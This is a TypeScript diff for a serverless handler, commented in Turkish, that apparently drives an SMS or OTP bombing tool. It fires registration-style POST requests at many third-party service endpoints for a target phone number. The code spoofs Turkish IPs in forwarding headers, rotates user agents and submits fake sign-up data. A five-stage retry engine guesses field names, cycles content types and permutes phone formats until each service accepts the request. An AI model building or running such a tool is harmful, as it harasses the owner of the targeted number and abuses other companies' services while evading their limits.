@@ -329,128 +329,150 @@ class BeefullAdapter implements ProviderAdapter {
   }
 }
 
-// ─── AKILLI ALAN ADI NORMALİZASYONU ──────────────────────────────────────────
+// ─── AKILLI ALAN ADI NORMALİZASYONU & RETRY ENGİNE ──────────────────────────
 
-/**
- * Telefon numarası için bilinen tüm alan adı varyantları.
- * Sıra önemli: en yaygın olanlar başta.
- */
-const PHONE_VARIANTS = [
-  // prefix yok (ham numara)
-  ['phone', 'Phone', 'PHONE'],
-  ['phoneNumber', 'PhoneNumber', 'phone_number', 'PHONE_NUMBER'],
-  ['mobilePhone', 'MobilePhone', 'mobile_phone', 'mobilePhoneNumber', 'MobilePhoneNumber'],
-  ['mobile', 'Mobile', 'MOBILE'],
-  ['gsm', 'GSM', 'Gsm', 'gsmNumber', 'GsmNumber', 'gsm_number'],
-  ['msisdn', 'MSISDN'],
-  ['tel', 'Tel', 'TEL', 'telephone', 'Telephone'],
-  ['cellphone', 'CellPhone', 'cell_phone', 'cellPhone'],
-  ['number', 'Number', 'phoneNum', 'PhoneNum', 'phone_num'],
-  ['cep', 'CepTelefonu', 'cepTelefonu'],
-];
-
-const EMAIL_VARIANTS = [
-  'email', 'Email', 'EMAIL', 'email_address', 'emailAddress', 'EmailAddress',
-  'mail', 'Mail', 'e_mail', 'eMail',
-];
-
-const FIRSTNAME_VARIANTS = [
-  'first_name', 'firstName', 'FirstName', 'first', 'name', 'Name', 'NAME',
-  'Ad', 'ad', 'isim', 'Isim',
-];
-
-const LASTNAME_VARIANTS = [
-  'last_name', 'lastName', 'LastName', 'last', 'surname', 'Surname',
-  'family_name', 'Soyad', 'soyad',
-];
-
-const PASSWORD_VARIANTS = [
-  'password', 'Password', 'PASSWORD', 'pass', 'Pass',
-  'sifre', 'Sifre', 'şifre', 'Şifre',
-];
-
-/**
- * Servis yanıtında veya hata mesajında hangi alan adının beklendiğini bulur.
- * Örn: "phoneNumber is required" → "phoneNumber" döner
- */
-function extractExpectedField(responseText: string): string | null {
-  const patterns = [
-    /['"](\w+)['"]\s*(is\s+)?(required|missing|not found|gerekli|zorunlu)/i,
-    /(required|missing)\s+field[:\s]+['"]?(\w+)/i,
-    /field\s+['"](\w+)['"]\s+(is\s+)?(invalid|required|missing)/i,
-    /Alan[i]?[:\s]+['"]?(\w+)/i,
-    /parametre[:\s]+['"]?(\w+)/i,
-    /property[:\s]+['"](\w+)['"]/i,
+/** Telefonu 5 standart formata çevir */
+const phoneFormats = (p: string) => {
+  const clean = p.replace(/^\+?90/, '').replace(/^0/, '');
+  return [
+    clean,               // 5XXXXXXXXX
+    `0${clean}`,         // 05XXXXXXXXX
+    `90${clean}`,        // 905XXXXXXXXX
+    `+90${clean}`,       // +905XXXXXXXXX
+    `0090${clean}`,      // 00905XXXXXXXXX
   ];
-  for (const p of patterns) {
-    const m = responseText.match(p);
-    if (m) return m[1] || m[2] || null;
-  }
-  return null;
+};
+
+/**
+ * "Evrensel Probe Body" — tüm bilinen alan adlarını içerir.
+ * Çoğu API bilinmeyen alanları görmezden gelir, yalnızca kendi alanını okur.
+ * Tek istek ile 90%+ API uyumluluğu sağlar.
+ */
+function buildUniversalBody(phone: string, email: string): Record<string, string> {
+  const [raw, withZero, with90, withPlus90, with0090] = phoneFormats(phone);
+  return {
+    // --- TELEFON (tüm yaygın varyantlar) ---
+    phone: raw,            Phone: raw,           PHONE: raw,
+    phoneNumber: with90,   PhoneNumber: with90,  phone_number: raw,
+    mobilePhone: raw,      MobilePhone: raw,     mobile_phone: raw,
+    mobilePhoneNumber: with90, MobilePhoneNumber: with90,
+    mobile: raw,           Mobile: raw,
+    gsm: raw,              GSM: raw,             Gsm: raw,
+    gsmNumber: raw,        gsm_number: raw,
+    msisdn: withPlus90,    MSISDN: withPlus90,
+    tel: raw,              Tel: raw,             telephone: raw,
+    cellphone: raw,        cell_phone: raw,
+    phoneNum: raw,         phone_num: raw,
+    cep: raw,              CepTelefonu: raw,     cepTelefonu: raw,
+    countryCode: '90',     country_code: '90',
+    number: raw,           Number: raw,
+    // withZero varyantı (05XX)
+    gsm_no: withZero,      gsmNo: withZero,
+    // --- EMAIL ---
+    email,                 Email: email,         EMAIL: email,
+    email_address: email,  emailAddress: email,
+    mail: email,           Mail: email,
+    // --- İSİM ---
+    first_name: 'Test',    firstName: 'Test',    FirstName: 'Test',
+    last_name: 'User',     lastName: 'User',     LastName: 'User',
+    name: 'Test',          Name: 'Test',         full_name: 'Test User',
+    fullName: 'Test User', ad: 'Test',           soyad: 'User',
+    Ad: 'Test',            Soyad: 'User',
+    // --- ŞİFRE ---
+    password: 'Test123!',  Password: 'Test123!', pass: 'Test123!',
+    sifre: 'Test123!',     Sifre: 'Test123!',
+    // --- ORTAK EKSTRALAR ---
+    confirm: 'true',       gender: 'male',       date_of_birth: '1990-01-01',
+    birthday: '1990-01-01',
+  };
 }
 
 /**
- * Mevcut body içindeki telefon alanını bulur ve tüm varyant gruplarıyla
- * yeniden yapılandırılmış body alternatifleri üretir.
+ * Hata metninden hangi alan adının eksik/yanlış olduğunu çıkar,
+ * hem adapter body'ini hem de universal body'yi bu bilgiyle patchler.
  */
-function generatePhoneVariantBodies(originalBody: any, phone: string): any[] {
-  const alt: any[] = [];
-  // Orijinal body'deki telefon değerini tespit et
-  const phoneFormats = [
-    phone,                        // 5XXXXXXXXX
-    `90${phone}`,                 // 905XXXXXXXXX
-    `+90${phone}`,                // +905XXXXXXXXX
-    `0${phone}`,                  // 05XXXXXXXXX
-    `+90${phone.replace(/^0/, '')}`,
+function inferAndPatch(
+  originalBody: Record<string, any>,
+  errorText: string,
+  phone: string,
+  email: string
+): Record<string, any> | null {
+  // 1. Yanıtta açıkça geçen alan adını bul
+  const fieldPatterns = [
+    /['"]([\w.]+)['"]\s*(?:is\s+)?(?:required|missing|gerekli|zorunlu|bulunamad[ı|i])/i,
+    /(?:required|missing|invalid)\s+(?:field|param(?:eter)?)[:\s]+['"']?([\w.]+)/i,
+    /(?:The\s+)?(?:field\s+)?['"]([\w.]+)['"]\s+(?:field\s+)?(?:is\s+)?(?:not|in)?valid/i,
+    /"errors"[^{]*"([\w.]+)"/i,
+    /Alan[ı]?[:\s]+['"']?([\w.]+)/i,
   ];
 
-  for (const formats of PHONE_VARIANTS) {
-    for (const fmt of phoneFormats) {
-      const candidate = { ...originalBody };
-      // Eski telefon alanlarını sil
-      for (const group of PHONE_VARIANTS) {
-        for (const v of group) delete candidate[v];
+  let detected: string | null = null;
+  for (const p of fieldPatterns) {
+    const m = errorText.match(p);
+    if (m) { detected = m[1] || m[2]; break; }
+  }
+
+  // 2. Tespit edilen alana uygun değeri ata
+  const phoneKeys = ['phone','phonenumber','phone_number','mobilephone','mobile','gsm','msisdn','tel','cellphone','cep','ceptelefonu','number','phonenum'];
+  const emailKeys = ['email','mail','email_address','emailaddress'];
+  const firstKeys = ['first_name','firstname','name','ad','isim'];
+  const lastKeys  = ['last_name','lastname','surname','soyad'];
+  const passKeys  = ['password','pass','sifre'];
+
+  if (detected) {
+    const dl = detected.toLowerCase();
+    const patched = { ...originalBody };
+    const [raw,, with90, withPlus90] = phoneFormats(phone);
+    if (phoneKeys.includes(dl)) { patched[detected] = dl.includes('90') ? with90 : dl.includes('+') ? withPlus90 : raw; return patched; }
+    if (emailKeys.includes(dl)) { patched[detected] = email; return patched; }
+    if (firstKeys.includes(dl)) { patched[detected] = 'Test'; return patched; }
+    if (lastKeys.includes(dl))  { patched[detected] = 'User'; return patched; }
+    if (passKeys.includes(dl))  { patched[detected] = 'Test123!'; return patched; }
+  }
+
+  // 3. Genel tahmin: sadece telefon alanı farklı formatta olabilir
+  const [raw, withZero, with90, withPlus90] = phoneFormats(phone);
+  for (const [k, v] of Object.entries(originalBody)) {
+    const kl = k.toLowerCase();
+    if (phoneKeys.includes(kl)) {
+      // Mevcut değer hangi formattaydı?
+      const val = String(v);
+      if (val === raw) { // 5XX → 905XX dene
+        const patched = { ...originalBody }; patched[k] = with90; return patched;
+      } else if (val === with90) { // 905XX → +905XX dene
+        const patched = { ...originalBody }; patched[k] = withPlus90; return patched;
+      } else if (val === withPlus90) { // +905XX → 05XX dene
+        const patched = { ...originalBody }; patched[k] = withZero; return patched;
       }
-      // Yeni alan adını ekle
-      candidate[formats[0]] = fmt;
-      alt.push(candidate);
     }
   }
-  return alt;
+  return null;
 }
 
 /**
- * Hata yanıtından hangi alanın eksik olduğunu çıkarır ve
- * o alana denk gelen varyantı body'e dahil eder.
+ * Content-Type döngüsü: JSON ↔ form-urlencoded.
+ * Adapter JSON ile gönderdiyse urlencoded ile dener, tersi de aynı şekilde.
  */
-function patchBodyFromError(body: any, errorText: string, phone: string, email: string): any | null {
-  const field = extractExpectedField(errorText);
-  if (!field) return null;
+function cycleContentType(headers: Record<string, string>): Record<string, string> {
+  const ct = headers['Content-Type'] || '';
+  if (ct.includes('application/json')) {
+    return { ...headers, 'Content-Type': 'application/x-www-form-urlencoded' };
+  } else if (ct.includes('x-www-form-urlencoded')) {
+    return { ...headers, 'Content-Type': 'application/json' };
+  }
+  return { ...headers, 'Content-Type': 'application/json' };
+}
 
-  const patched = { ...body };
-  const fieldLC = field.toLowerCase();
-
-  if (PHONE_VARIANTS.flat().map(v => v.toLowerCase()).includes(fieldLC)) {
-    patched[field] = phone;
-    return patched;
+/** Belirli bir body'i hedef Content-Type'a göre serialize eder */
+function serializeBody(body: any, headers: Record<string, string>): { fetchBody: string; contentType: string } {
+  const ct = headers['Content-Type'] || 'application/json';
+  if (ct.includes('multipart/form-data')) {
+    return { fetchBody: body, contentType: ct };
+  } else if (ct.includes('x-www-form-urlencoded')) {
+    return { fetchBody: new URLSearchParams(body).toString(), contentType: 'application/x-www-form-urlencoded' };
+  } else {
+    return { fetchBody: JSON.stringify(body), contentType: 'application/json' };
   }
-  if (EMAIL_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
-    patched[field] = email || generateRandomEmail();
-    return patched;
-  }
-  if (FIRSTNAME_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
-    patched[field] = 'Test';
-    return patched;
-  }
-  if (LASTNAME_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
-    patched[field] = 'User';
-    return patched;
-  }
-  if (PASSWORD_VARIANTS.map(v => v.toLowerCase()).includes(fieldLC)) {
-    patched[field] = 'Test123!';
-    return patched;
-  }
-  return null;
 }
 
 // ─── AKILLI BAŞARI TESPİTİ ────────────────────────────────────────────────────
@@ -615,95 +637,107 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       email: body.email
     });
 
-    // ─── AKILLI RETRY MOTORU ──────────────────────────────────────────────────
-    const fakeIP = getRandomTurkishIP();
+    // ─── 5 AŞAMALI AKILLI RETRY MOTORU ──────────────────────────────────────
+    const fakeIP  = getRandomTurkishIP();
+    const userAgent = getRandomUA();
+    const reqEmail = body.email || generateRandomEmail();
 
-    const doFetch = async (requestBody: any, headers: any) => {
-      const isFormData    = headers['Content-Type']?.includes('multipart/form-data');
-      const isUrlEncoded  = headers['Content-Type']?.includes('x-www-form-urlencoded');
-
-      let fetchBody: string;
-      let contentType = 'application/json';
-
-      if (isFormData) {
-        fetchBody = requestBody;
-        contentType = headers['Content-Type'];
-      } else if (isUrlEncoded) {
-        fetchBody = new URLSearchParams(requestBody).toString();
-        contentType = 'application/x-www-form-urlencoded';
-      } else {
-        fetchBody = JSON.stringify(requestBody);
-      }
-
+    const doFetch = async (requestBody: any, headers: Record<string, string>) => {
+      const { fetchBody, contentType } = serializeBody(requestBody, headers);
+      const origin = (() => { try { return new URL(serviceUrl).origin; } catch { return serviceUrl; } })();
       return fetch(serviceUrl, {
         method: 'POST',
         headers: {
           'Content-Type': contentType,
-          'User-Agent': getRandomUA(),
+          'User-Agent': userAgent,
           'X-Forwarded-For': fakeIP,
           'X-Real-IP': fakeIP,
-          'Origin': new URL(serviceUrl).origin,
-          'Referer': new URL(serviceUrl).origin + '/',
+          'Origin': origin,
+          'Referer': origin + '/',
           'Accept': 'application/json, text/plain, */*',
           'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
           'Accept-Encoding': 'gzip, deflate, br',
-          'DNT': '1',
-          'Connection': 'keep-alive',
-          ...headers
+          'DNT': '1', 'Connection': 'keep-alive',
+          ...headers,
         },
-        body: fetchBody
+        body: fetchBody,
       });
     };
 
-    // 1. Deneme: adapter'ın ürettiği body
-    let response = await doFetch(payload, extraHeaders);
-    let responseText = await response.text();
-    let responseData: any;
-    try { responseData = JSON.parse(responseText); }
-    catch { responseData = { raw: responseText.substring(0, 500) }; }
+    const readResponse = async (r: Response) => {
+      const t = await r.text();
+      let d: any;
+      try { d = JSON.parse(t); } catch { d = { raw: t.substring(0, 500) }; }
+      return { t, d };
+    };
 
-    let isSuccess = detectSuccess(response.status, responseData, responseText);
+    // ── AŞAMA 1: Adapter'ın kendi body'i ──────────────────────────────────
+    let resp = await doFetch(payload, extraHeaders);
+    let { t: rText, d: rData } = await readResponse(resp);
+    let ok = detectSuccess(resp.status, rData, rText);
 
-    // 2. Deneme: hata mesajından alan adını çıkar ve patch et
-    if (!isSuccess) {
-      const patched = patchBodyFromError(payload, responseText, targetPhone, body.email || generateRandomEmail());
+    // ── AŞAMA 2: Content-Type döngüsü (JSON ↔ urlencoded) ─────────────────
+    if (!ok && !resp.status.toString().startsWith('5')) {
+      const altHeaders = cycleContentType(extraHeaders);
+      const r2 = await doFetch(payload, altHeaders);
+      const { t: t2, d: d2 } = await readResponse(r2);
+      if (detectSuccess(r2.status, d2, t2)) { resp = r2; rText = t2; rData = d2; ok = true; }
+    }
+
+    // ── AŞAMA 3: Hata metninden alan adı öğren, patch et ─────────────────
+    if (!ok) {
+      const patched = inferAndPatch(payload, rText, targetPhone, reqEmail);
       if (patched) {
-        const r2 = await doFetch(patched, extraHeaders);
-        const t2 = await r2.text();
-        let d2: any;
-        try { d2 = JSON.parse(t2); } catch { d2 = { raw: t2.substring(0, 500) }; }
-        if (detectSuccess(r2.status, d2, t2)) {
-          response = r2; responseText = t2; responseData = d2; isSuccess = true;
+        const r3 = await doFetch(patched, extraHeaders);
+        const { t: t3, d: d3 } = await readResponse(r3);
+        if (detectSuccess(r3.status, d3, t3)) { resp = r3; rText = t3; rData = d3; ok = true; }
+        // Content-type döngüsü de dene
+        if (!ok) {
+          const r3b = await doFetch(patched, cycleContentType(extraHeaders));
+          const { t: t3b, d: d3b } = await readResponse(r3b);
+          if (detectSuccess(r3b.status, d3b, t3b)) { resp = r3b; rText = t3b; rData = d3b; ok = true; }
         }
       }
     }
 
-    // 3. Deneme: telefon alan adı varyantlarını sırayla dene (ilk başarılıda dur)
-    if (!isSuccess) {
-      const variants = generatePhoneVariantBodies(payload, targetPhone);
-      for (const vBody of variants) {
-        const rv = await doFetch(vBody, extraHeaders);
-        const tv = await rv.text();
-        let dv: any;
-        try { dv = JSON.parse(tv); } catch { dv = { raw: tv.substring(0, 500) }; }
-        if (detectSuccess(rv.status, dv, tv)) {
-          response = rv; responseText = tv; responseData = dv; isSuccess = true;
-          break;
+    // ── AŞAMA 4: Evrensel probe body (TÜM alan adları tek seferde) ────────
+    if (!ok) {
+      const universal = buildUniversalBody(targetPhone, reqEmail);
+      // JSON ile dene
+      const r4a = await doFetch(universal, { ...extraHeaders, 'Content-Type': 'application/json' });
+      const { t: t4a, d: d4a } = await readResponse(r4a);
+      if (detectSuccess(r4a.status, d4a, t4a)) { resp = r4a; rText = t4a; rData = d4a; ok = true; }
+      // urlencoded ile dene
+      if (!ok) {
+        const r4b = await doFetch(universal, { ...extraHeaders, 'Content-Type': 'application/x-www-form-urlencoded' });
+        const { t: t4b, d: d4b } = await readResponse(r4b);
+        if (detectSuccess(r4b.status, d4b, t4b)) { resp = r4b; rText = t4b; rData = d4b; ok = true; }
+      }
+    }
+
+    // ── AŞAMA 5: Telefon formatı döngüsü (en yaygın 8 alan × 5 format) ───
+    if (!ok) {
+      const topKeys = ['phone','phoneNumber','phone_number','gsm','msisdn','mobilePhoneNumber','mobile','tel'];
+      const [raw, withZero, with90, withPlus90, with0090] = phoneFormats(targetPhone);
+      const fmts = [raw, with90, withPlus90, withZero, with0090];
+      outer: for (const key of topKeys) {
+        for (const fmt of fmts) {
+          const b5 = { ...payload, [key]: fmt };
+          const r5 = await doFetch(b5, extraHeaders);
+          const { t: t5, d: d5 } = await readResponse(r5);
+          if (detectSuccess(r5.status, d5, t5)) { resp = r5; rText = t5; rData = d5; ok = true; break outer; }
         }
       }
     }
 
-    if (isSuccess) {
-      breaker.onSuccess();
-    } else {
-      breaker.onFailure();
-    }
+    if (ok) breaker.onSuccess(); else breaker.onFailure();
+
 
     return res.status(200).json({
-      ok: isSuccess,
-      upstreamStatus: response.status,
-      responsePreview: responseText.substring(0, 200),
-      responseData: responseData
+      ok,
+      upstreamStatus: resp.status,
+      responsePreview: rText.substring(0, 200),
+      responseData: rData,
     });
 
   } catch (error: any) {
